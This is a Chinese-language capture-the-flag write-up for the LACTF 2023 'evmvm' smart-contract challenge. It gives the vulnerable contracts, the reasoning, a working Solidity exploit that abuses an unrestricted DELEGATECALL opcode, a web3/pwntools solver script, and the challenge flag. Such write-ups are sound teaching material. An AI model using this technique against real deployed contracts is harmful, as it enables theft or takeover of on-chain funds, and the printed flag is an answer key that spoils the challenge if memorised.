---
title: Blockchain - evmvm
description: 2023 | LACTF | pwn
tags:
    - smart contract
    - evm
    - assembly
    - yul
---

## 题目

All these zoomers with their "metaverse" or something are thinking far too primitive. If the red pill goes down the rabbit hole, then how far up can we go?

> nc lac.tf 31151

??? note "Setup.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.18;

    import "./EVMVM.sol";

    contract Setup {
        EVMVM public immutable metametaverse = new EVMVM();
        bool private solved = false;

        function solve() external {
            assert(msg.sender == address(metametaverse));
            solved = true;
        }

        function isSolved() external view returns (bool) {
            return solved;
        }
    }
    ```

??? note "EVMVM.sol"

    ```{ .js .annotate }
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.18;

    // YES I FINALLY GOT MY METAMETAVERSE TO WORK - Arc'blroth
    contract EVMVM {
        uint[] private stack;

        // executes a single opcode on the metametaverse™
        // TODO(arc) implement the last few opcodes
        function enterTheMetametaverse(bytes32 opcode, bytes32 arg) external {
            assembly {
                // declare yul bindings for the stack
                // apparently you can only call yul functions from yul :sob:
                // https://ethereum.stackexchange.com/questions/126609/calling-functions-using-inline-assembly-yul

                function spush(data) {
                    let index := sload(0x00)
                    let stackSlot := 0x00
                    sstore(add(keccak256(stackSlot, 0x20), index), data)
                    sstore(0x00, add(index, 1))
                }

                function spop() -> out {
                    let index := sub(sload(0x00), 1)
                    let stackSlot := 0x00
                    out := sload(add(keccak256(stackSlot, 0x20), index))
                    sstore(add(keccak256(stackSlot, 0x20), index), 0) // zero out the popped memory
                    sstore(0x00, index)
                }

                // opcode reference: https://www.evm.codes/?fork=merge
                switch opcode
                    case 0x00 { // STOP
                        // lmfao you literally just wasted gas
                    }
                    case 0x01 { // ADD
                        spush(add(spop(), spop()))
                    }
                    case 0x02 { // MUL
                        spush(mul(spop(), spop()))
                    }
                    case 0x03 { // SUB
                        spush(sub(spop(), spop()))
                    }
                    case 0x04 { // DIV
                        spush(div(spop(), spop()))
                    }
                    case 0x05 { // SDIV
                        spush(sdiv(spop(), spop()))
                    }
                    case 0x06 { // MOD
                        spush(mod(spop(), spop()))
                    }
                    case 0x07 { // SMOD
                        spush(smod(spop(), spop()))
                    }
                    case 0x08 { // ADDMOD
                        spush(addmod(spop(), spop(), spop()))
                    }
                    case 0x09 { // MULMOD
                        spush(mulmod(spop(), spop(), spop()))
                    }
                    case 0x0A { // EXP
                        spush(exp(spop(), spop()))
                    }
                    case 0x0B { // SIGNEXTEND
                        spush(signextend(spop(), spop()))
                    }
                    case 0x10 { // LT
                        spush(lt(spop(), spop()))
                    }
                    case 0x11 { // GT
                        spush(gt(spop(), spop()))
                    }
                    case 0x12 { // SLT
                        spush(slt(spop(), spop()))
                    }
                    case 0x13 { // SGT
                        spush(sgt(spop(), spop()))
                    }
                    case 0x14 { // EQ
                        spush(eq(spop(), spop()))
                    }
                    case 0x15 { // ISZERO
                        spush(iszero(spop()))
                    }
                    case 0x16 { // AND
                        spush(and(spop(), spop()))
                    }
                    case 0x17 { // OR
                        spush(or(spop(), spop()))
                    }
                    case 0x18 { // XOR
                        spush(xor(spop(), spop()))
                    }
                    case 0x19 { // NOT
                        spush(not(spop()))
                    }
                    case 0x1A { // BYTE
                        spush(byte(spop(), spop()))
                    }
                    case 0x1B { // SHL
                        spush(shl(spop(), spop()))
                    }
                    case 0x1C { // SHR
                        spush(shr(spop(), spop()))
                    }
                    case 0x1D { // SAR
                        spush(sar(spop(), spop()))
                    }
                    case 0x20 { // SHA3
                        spush(keccak256(spop(), spop()))
                    }
                    case 0x30 { // ADDRESS
                        spush(address())
                    }
                    case 0x31 { // BALANCE
                        spush(balance(spop()))
                    }
                    case 0x32 { // ORIGIN
                        spush(origin())
                    }
                    case 0x33 { // CALLER
                        spush(caller())
                    }
                    case 0x34 { // CALLVALUE
                        spush(callvalue())
                    }
                    case 0x35 { // CALLDATALOAD
                        spush(calldataload(spop()))
                    }
                    case 0x36 { // CALLDATASIZE
                        spush(calldatasize())
                    }
                    case 0x37 { // CALLDATACOPY
                        calldatacopy(spop(), spop(), spop())
                    }
                    case 0x38 { // CODESIZE
                        spush(codesize())
                    }
                    case 0x3A { // GASPRICE
                        spush(gasprice())
                    }
                    case 0x3B { // EXTCODESIZE
                        spush(extcodesize(spop()))
                    }
                    case 0x3C { // EXTCODECOPY
                        extcodecopy(spop(), spop(), spop(), spop())
                    }
                    case 0x3D { // RETURNDATASIZE
                        spush(returndatasize())
                    }
                    case 0x3E { // RETURNDATACOPY
                        returndatacopy(spop(), spop(), spop())
                    }
                    case 0x3F { // EXTCODEHASH
                        spush(extcodehash(spop()))
                    }
                    case 0x40 { // BLOCKHASH
                        spush(blockhash(spop()))
                    }
                    case 0x41 { // COINBASE (sponsored opcode)
                        spush(coinbase())
                    }
                    case 0x42 { // TIMESTAMP
                        spush(timestamp())
                    }
                    case 0x43 { // NUMBER
                        spush(number())
                    }
                    case 0x44 { // PREVRANDAO
                        // spush(difficulty())
                        spush(prevrandao()) // (1)
                    }
                    case 0x45 { // GASLIMIT
                        spush(gaslimit())
                    }
                    case 0x46 { // CHAINID
                        spush(chainid())
                    }
                    case 0x47 { // SELBALANCE
                        spush(selfbalance())
                    }
                    case 0x48 { // BASEFEE
                        spush(basefee())
                    }
                    case 0x50 { // POP
                        pop(spop())
                    }
                    case 0x51 { // MLOAD
                        spush(mload(spop()))
                    }
                    case 0x52 { // MSTORE
                        mstore(spop(), spop())
                    }
                    case 0x53 { // MSTORE8
                        mstore8(spop(), spop())
                    }
                    case 0x54 { // SLOAD
                        spush(sload(spop()))
                    }
                    case 0x55 { // SSTORE
                        sstore(spop(), spop())
                    }
                    case 0x59 { // MSIZE
                        spush(msize())
                    }
                    case 0x5A { // GAS
                        spush(gas())
                    }
                    case 0x80 { // DUP1
                        let val := spop()
                        spush(val)
                        spush(val)
                    }
                    case 0x91 { // SWAP1
                        let a := spop()
                        let b := spop()
                        spush(a)
                        spush(b)
                    }
                    case 0xF0 { // CREATE
                        spush(create(spop(), spop(), spop()))
                    }
                    case 0xF1 { // CALL
                        spush(call(spop(), spop(), spop(), spop(), spop(), spop(), spop()))
                    }
                    case 0xF2 { // CALLCODE
                        spush(callcode(spop(), spop(), spop(), spop(), spop(), spop(), spop()))
                    }
                    case 0xF3 { // RETURN
                        return(spop(), spop())
                    }
                    case 0xF4 { // DELEGATECALL
                        spush(delegatecall(spop(), spop(), spop(), spop(), spop(), spop()))
                    }
                    case 0xF5 { // CREATE2
                        spush(create2(spop(), spop(), spop(), spop()))
                    }
                    case 0xFA { // STATICCALL
                        spush(staticcall(spop(), spop(), spop(), spop(), spop(), spop()))
                    }
                    case 0xFD { // REVERT
                        revert(spop(), spop())
                    }
                    case 0xFE { // INVALID
                        invalid()
                    }
                    case 0xFF { // SELFDESTRUCT
                        selfdestruct(spop())
                    }
            }
        }

        fallback() payable external {
            revert("sus");
        }

        receive() payable external {
            revert("we are a cashless institution");
        }
    }
    ```

    1. Paris 版本起，`DIFFICULTY` 由 `PREVRANDAO` 替代，可获取上一个区块的 RANDAO mix

## 解题思路

- 目标是通过合约 `EVMVM` 调用 `Setup.solve()`
- `EVMVM` 借助 Yul 模拟 EVM，调用一次 `enterTheMetametaverse()` 可执行一个操作码
- 需要调用 `Setup.solve()`，查看调用相关的操作码
    - `call(g, a, v, in, insize, out, outsize)` 调用特定函数需要借助 memory 存储函数签名以及传参，而一次只能执行一个操作码且 memory 在单次调用结束后即被清除
    - 可以通过 `delegatecall(g, a, in, insize, out, outsize)` 借助其它代码，由于无法传递特定的函数签名及参数，调用逻辑在 `fallback()` 中实现并硬编码 `Setup` 实例的地址
- Yul 中函数参数从右往左入栈，将先执行最右侧的 `spop()`，因而从左往右将 `delegatecall` 需要的参数入栈
    - `g`，可以简单地借用 `GASLIMIT` 来设置
    - `a`，通过 `arg` 传入 `Setup` 的地址，由 `calldataload(p)` 获取。可借助 `CHAINID`（值为 1）来构造任意值

            sig(4 bytes) | opcode(32 bytes) | arg(32 bytes)
            -|-|-

    - `in` & `insize` & `out` & `outsize`，无需传参且没有输出，可设置为 0

### Exploit

```js
pragma solidity ^0.8.18;

interface IEVMVM {
    function enterTheMetametaverse(bytes32 opcode, bytes32 arg) external;
}
interface ISetup {
    function solve() external;
}

contract Hack {
    
    function exploit(address instance) public {
        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x45)), bytes32(0)); // GASLIMIT
        
        // get 36
        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x36)), bytes32(0));
        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x46)), bytes32(0));
        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x46)), bytes32(0));
        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x01)), bytes32(0));
        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x04)), bytes32(0));
        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x46)), bytes32(0));
        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x46)), bytes32(0));
        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x01)), bytes32(0));
        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x01)), bytes32(0));

        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x35)), bytes32(uint256(uint160(address(this))))); // CALLDATALOAD

        // get 0
        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x30)), bytes32(0)); // ADDRESS
        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x31)), bytes32(0)); // BALANCE

        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x80)), bytes32(0)); // DUP1
        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x80)), bytes32(0)); // DUP1
        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0x80)), bytes32(0)); // DUP1

        IEVMVM(instance).enterTheMetametaverse(bytes32(uint(0xF4)), bytes32(0)); // DELEGATECALL
    }

    fallback() external {
        ISetup(/* set the addr before deployment */).solve();
    }
}
```

```py
from web3 import Web3
from pwn import *

setup_abi = open('setup_abi.json').read()
hack_abi = open('hack_abi.json').read()
hack_bytecode = open('bytecode.txt').read()

def transact(func, gas=1000000):
    tx = account.sign_transaction(eval(func).buildTransaction({
        'chainId': w3.eth.chain_id,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': gas,
        'gasPrice': w3.eth.gas_price,
    })).rawTransaction
    tx_hash = w3.eth.send_raw_transaction(tx).hex()
    return w3.eth.wait_for_transaction_receipt(tx_hash)

conn = remote('lac.tf', 31151)

conn.sendlineafter('action?', '1')
uuid = conn.recvline_contains('uuid').decode().split(' ')[-1].strip()
w3 = Web3(Web3.HTTPProvider(conn.recvline_contains('rpc').decode().split(' ')[-1]))
account = w3.eth.account.from_key(conn.recvline_contains('key').decode().split(' ')[-1])

setup_addr = conn.recvline_contains('contract').decode().split(' ')[-1].strip()
setup_contract = w3.eth.contract(address=setup_addr, abi=setup_abi)

evmvm_addr = setup_contract.functions.metametaverse().call()

hack_contract = w3.eth.contract(abi=hack_abi, bytecode=hack_bytecode.replace('_', setup_addr[2:].lower()))
hack_addr = transact('hack_contract.constructor()',hack_contract.constructor().estimate_gas() * 2).contractAddress
hack_contract = w3.eth.contract(address=hack_addr, abi=hack_abi)
print(hack_addr)

transact('hack_contract.functions.exploit(evmvm_addr)')

if setup_contract.functions.isSolved().call():
	conn = remote('lac.tf', 31151)
	conn.sendlineafter('action?', '3')
	conn.sendlineafter('uuid please:', uuid)
	conn.interactive()
```

### Flag

> lactf{yul_hav3_a_bad_t1me_0n_th3_m3tam3tavers3}

## 参考资料

- [EVM Codes - An Ethereum Virtual Machine Opcodes Interactive Reference](https://www.evm.codes/?fork=merge)
- [Yul — Solidity 0.8.18 documentation](https://docs.soliditylang.org/en/v0.8.18/yul.html)
- [EIP-4399: Supplant DIFFICULTY opcode with PREVRANDAO](https://eips.ethereum.org/EIPS/eip-4399)